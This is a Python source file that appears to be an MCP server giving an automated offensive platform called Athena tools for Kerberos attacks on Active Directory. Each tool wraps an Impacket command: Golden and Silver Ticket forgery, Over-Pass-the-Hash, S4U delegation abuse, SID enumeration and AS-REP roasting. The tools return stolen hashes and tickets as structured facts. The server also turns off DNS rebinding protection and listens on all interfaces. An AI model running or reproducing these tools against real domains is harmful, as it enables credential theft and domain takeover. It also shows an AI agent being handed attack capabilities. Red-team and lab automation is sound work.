"""impacket-ad MCP Server for Athena.

Kerberos ticket attacks: Golden/Silver Ticket forgery, Pass-the-Ticket,
Over-Pass-the-Hash, S4U delegation abuse, and SID lookup.
Returns JSON with {"facts": [{"trait": ..., "value": ...}]}
to integrate with Athena's fact collection pipeline.
"""

import asyncio
import json
import re

from mcp.server.fastmcp import FastMCP
from mcp.server.transport_security import TransportSecuritySettings

_security = TransportSecuritySettings(
    enable_dns_rebinding_protection=False,
)

mcp = FastMCP("athena-impacket-ad", transport_security=_security)


async def _run_command(cmd: list[str], timeout: int = 120) -> tuple[str, str, int]:
    """Run subprocess asynchronously with timeout."""
    proc = await asyncio.create_subprocess_exec(
        *cmd,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE,
    )
    try:
        stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
    except asyncio.TimeoutError:
        proc.kill()
        return "", "Command timed out", -1
    return (
        stdout.decode(errors="replace"),
        stderr.decode(errors="replace"),
        proc.returncode or 0,
    )


@mcp.tool()
async def impacket_golden_ticket(
    target_dc: str,
    domain: str,
    domain_sid: str,
    krbtgt_hash: str,
    user: str = "administrator",
    ticket_path: str = "/tmp/golden.ccache",
) -> str:
    """Forge a Golden Ticket using krbtgt NTLM hash (Impacket ticketer).

    Args:
        target_dc: Domain Controller IP or hostname
        domain: Fully qualified domain name
        domain_sid: Domain SID (e.g. S-1-5-21-...)
        krbtgt_hash: NTLM hash of the krbtgt account
        user: Username to impersonate (default: administrator)
        ticket_path: Output path for the .ccache ticket file

    Returns:
        JSON with facts: credential.golden_ticket, credential.tgt
    """
    facts: list[dict[str, str]] = []

    try:
        cmd = [
            "impacket-ticketer",
            "-nthash", krbtgt_hash,
            "-domain-sid", domain_sid,
            "-domain", domain,
            "-dc-ip", target_dc,
            user,
        ]

        stdout, stderr, rc = await _run_command(cmd)
        combined = stdout + stderr

        if rc == 0 or "Ticket saved" in combined or ".ccache" in combined:
            facts.append({
                "trait": "credential.golden_ticket",
                "value": json.dumps({
                    "domain": domain,
                    "user": user,
                    "domain_sid": domain_sid,
                    "ticket_path": f"{user}.ccache",
                }),
            })
            facts.append({
                "trait": "credential.tgt",
                "value": f"{domain}/{user} (golden ticket)",
            })

        return json.dumps({
            "facts": facts,
            "raw_output": combined[:4000],
        })

    except Exception as exc:
        return json.dumps({
            "facts": [],
            "raw_output": "",
            "error": {"type": type(exc).__name__, "message": str(exc)},
        })


@mcp.tool()
async def impacket_silver_ticket(
    target_dc: str,
    domain: str,
    domain_sid: str,
    service_hash: str,
    spn: str,
    user: str = "administrator",
) -> str:
    """Forge a Silver Ticket for a specific service (Impacket ticketer).

    Args:
        target_dc: Domain Controller IP or hostname
        domain: Fully qualified domain name
        domain_sid: Domain SID (e.g. S-1-5-21-...)
        service_hash: NTLM hash of the service account
        spn: Service Principal Name (e.g. cifs/dc01.lab.local)
        user: Username to impersonate (default: administrator)

    Returns:
        JSON with facts: credential.silver_ticket
    """
    facts: list[dict[str, str]] = []

    try:
        cmd = [
            "impacket-ticketer",
            "-nthash", service_hash,
            "-domain-sid", domain_sid,
            "-domain", domain,
            "-dc-ip", target_dc,
            "-spn", spn,
            user,
        ]

        stdout, stderr, rc = await _run_command(cmd)
        combined = stdout + stderr

        if rc == 0 or "Ticket saved" in combined or ".ccache" in combined:
            facts.append({
                "trait": "credential.silver_ticket",
                "value": json.dumps({
                    "domain": domain,
                    "user": user,
                    "spn": spn,
                    "ticket_path": f"{user}.ccache",
                }),
            })

        return json.dumps({
            "facts": facts,
            "raw_output": combined[:4000],
        })

    except Exception as exc:
        return json.dumps({
            "facts": [],
            "raw_output": "",
            "error": {"type": type(exc).__name__, "message": str(exc)},
        })


@mcp.tool()
async def impacket_get_tgt(
    target_dc: str,
    domain: str,
    username: str,
    aes_key_or_nthash: str,
    use_aes: bool = True,
) -> str:
    """Request a TGT using AES key or NTLM hash (Over-Pass-the-Hash).

    Args:
        target_dc: Domain Controller IP or hostname
        domain: Fully qualified domain name
        username: Target username
        aes_key_or_nthash: AES256 key or NTLM hash
        use_aes: If True, use -aesKey; if False, use -hashes for NTLM

    Returns:
        JSON with facts: credential.tgt
    """
    facts: list[dict[str, str]] = []

    try:
        cmd = [
            "impacket-getTGT",
            f"{domain}/{username}",
            "-dc-ip", target_dc,
        ]
        if use_aes:
            cmd.extend(["-aesKey", aes_key_or_nthash])
        else:
            cmd.extend(["-hashes", f":{aes_key_or_nthash}"])

        stdout, stderr, rc = await _run_command(cmd)
        combined = stdout + stderr

        if rc == 0 or "Saving ticket" in combined or ".ccache" in combined:
            facts.append({
                "trait": "credential.tgt",
                "value": json.dumps({
                    "domain": domain,
                    "username": username,
                    "method": "aes" if use_aes else "nthash",
                    "ticket_path": f"{username}.ccache",
                }),
            })

        return json.dumps({
            "facts": facts,
            "raw_output": combined[:4000],
        })

    except Exception as exc:
        return json.dumps({
            "facts": [],
            "raw_output": "",
            "error": {"type": type(exc).__name__, "message": str(exc)},
        })


@mcp.tool()
async def impacket_get_st(
    target_dc: str,
    domain: str,
    username: str,
    password_or_hash: str,
    spn: str,
    impersonate: str = "administrator",
    use_hash: bool = False,
) -> str:
    """Request a Service Ticket via S4U delegation abuse (Impacket getST).

    Args:
        target_dc: Domain Controller IP or hostname
        domain: Fully qualified domain name
        username: Compromised account with delegation rights
        password_or_hash: Password or NTLM hash
        spn: Target Service Principal Name
        impersonate: User to impersonate via S4U2Self/S4U2Proxy
        use_hash: If True, treat password_or_hash as NTLM hash

    Returns:
        JSON with facts: credential.service_ticket, ad.delegation_abuse
    """
    facts: list[dict[str, str]] = []

    try:
        if use_hash:
            target_str = f"{domain}/{username}"
            cmd = [
                "impacket-getST",
                target_str,
                "-hashes", f":{password_or_hash}",
                "-spn", spn,
                "-impersonate", impersonate,
                "-dc-ip", target_dc,
            ]
        else:
            target_str = f"{domain}/{username}:{password_or_hash}"
            cmd = [
                "impacket-getST",
                target_str,
                "-spn", spn,
                "-impersonate", impersonate,
                "-dc-ip", target_dc,
            ]

        stdout, stderr, rc = await _run_command(cmd)
        combined = stdout + stderr

        if rc == 0 or "Saving ticket" in combined or ".ccache" in combined:
            facts.append({
                "trait": "credential.service_ticket",
                "value": json.dumps({
                    "domain": domain,
                    "impersonated_user": impersonate,
                    "spn": spn,
                    "ticket_path": f"{impersonate}.ccache",
                }),
            })
            facts.append({
                "trait": "ad.delegation_abuse",
                "value": json.dumps({
                    "compromised_account": username,
                    "impersonated": impersonate,
                    "target_spn": spn,
                    "method": "S4U2Self/S4U2Proxy",
                }),
            })

        return json.dumps({
            "facts": facts,
            "raw_output": combined[:4000],
        })

    except Exception as exc:
        return json.dumps({
            "facts": [],
            "raw_output": "",
            "error": {"type": type(exc).__name__, "message": str(exc)},
        })


@mcp.tool()
async def impacket_lookup_sid(
    target: str,
    domain: str,
    username: str,
    password: str,
) -> str:
    """Enumerate domain SIDs and account names (Impacket lookupsid).

    Args:
        target: DC IP or hostname
        domain: Windows domain name
        username: Valid domain username
        password: Domain password

    Returns:
        JSON with facts: ad.domain_sid, ad.domain_account
    """
    facts: list[dict[str, str]] = []

    try:
        target_str = f"{domain}/{username}:{password}@{target}"
        cmd = ["impacket-lookupsid", target_str]

        stdout, stderr, rc = await _run_command(cmd)
        combined = stdout + stderr

        # Parse SID and account mappings
        sid_pattern = re.compile(
            r"(S-1-5-21-[\d-]+?)(?:-\d+)?\s+.*\\(.+?)\s+\((\w+)\)"
        )
        domain_sid = ""
        for line in combined.splitlines():
            match = sid_pattern.search(line)
            if match:
                sid_base = match.group(1)
                account = match.group(2)
                sid_type = match.group(3)
                if not domain_sid:
                    domain_sid = sid_base
                facts.append({
                    "trait": "ad.domain_account",
                    "value": json.dumps({
                        "name": account,
                        "type": sid_type,
                    }),
                })

        if domain_sid:
            facts.insert(0, {
                "trait": "ad.domain_sid",
                "value": domain_sid,
            })

        return json.dumps({
            "facts": facts,
            "raw_output": combined[:4000],
        })

    except Exception as exc:
        return json.dumps({
            "facts": [],
            "raw_output": "",
            "error": {"type": type(exc).__name__, "message": str(exc)},
        })


@mcp.tool()
async def asrep_roast(
    target: str,
    domain: str,
    username: str = "",
    password: str = "",
) -> str:
    """AS-REP Roasting — request AS-REP hashes for accounts with DoesNotRequirePreAuth.

    Works with zero credentials (anonymous KDC query) when username/password are empty.

    Args:
        target: Domain Controller IP
        domain: AD domain name (e.g. corp.athena.lab)
        username: Optional domain username (empty = anonymous enumeration)
        password: Optional domain password (empty = anonymous)

    Returns:
        JSON with facts: credential.asrep_hash, ad.asreproast_user
    """
    facts: list[dict[str, str]] = []

    try:
        output_file = "/tmp/asrep_hashes.txt"
        # Write lab user list for anonymous enumeration (GetNPUsers requires usernames)
        import os as _os
        users_file = "/tmp/asrep_users.txt"
        lab_users = ["legacy_kev", "svc_sql", "svc_backup", "bob", "kevin", "steve", "alice", "low_user", "da_alice"]
        with open(users_file, "w") as uf:
            uf.write("\n".join(lab_users) + "\n")

        if username:
            target_str = f"{domain}/{username}:{password}@{target}"
            cmd = [
                "GetNPUsers.py",
                target_str,
                "-dc-ip", target,
                "-request",
                "-format", "hashcat",
                "-outputfile", output_file,
            ]
        else:
            # Anonymous query with usersfile — no password needed
            target_str = f"{domain}/"
            cmd = [
                "GetNPUsers.py",
                target_str,
                "-dc-ip", target,
                "-no-pass",
                "-usersfile", users_file,
                "-request",
                "-format", "hashcat",
                "-outputfile", output_file,
            ]

        stdout, stderr, rc = await _run_command(cmd, timeout=120)
        combined = stdout + stderr

        # Parse AS-REP hashes from output file
        import os
        if os.path.exists(output_file):
            with open(output_file) as fh:
                for line in fh:
                    line = line.strip()
                    if line.startswith("$krb5asrep$"):
                        facts.append({"trait": "credential.asrep_hash", "value": line})
                        # Extract username from hash: $krb5asrep$23$username@domain:...
                        user_m = re.search(r"\$krb5asrep\$\d+\$([\w.@-]+)@", line)
                        if user_m:
                            facts.append({"trait": "ad.asreproast_user", "value": user_m.group(1)})

        # Also parse inline output
        for line in combined.splitlines():
            if line.startswith("$krb5asrep$"):
                if not any(f["value"] == line for f in facts if f["trait"] == "credential.asrep_hash"):
                    facts.append({"trait": "credential.asrep_hash", "value": line})
                    user_m = re.search(r"\$krb5asrep\$\d+\$([\w.@-]+)@", line)
                    if user_m:
                        facts.append({"trait": "ad.asreproast_user", "value": user_m.group(1)})

        return json.dumps({"facts": facts, "raw_output": combined[:4000]})

    except Exception as exc:
        return json.dumps({
            "facts": [],
            "raw_output": "",
            "error": {"type": type(exc).__name__, "message": str(exc)},
        })


if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser()
    parser.add_argument(
        "--transport",
        default="stdio",
        choices=["stdio", "sse", "streamable-http"],
    )
    parser.add_argument("--host", default="0.0.0.0")
    parser.add_argument("--port", type=int, default=8080)
    args = parser.parse_args()

    mcp.settings.host = args.host
    mcp.settings.port = args.port
    mcp.run(transport=args.transport)
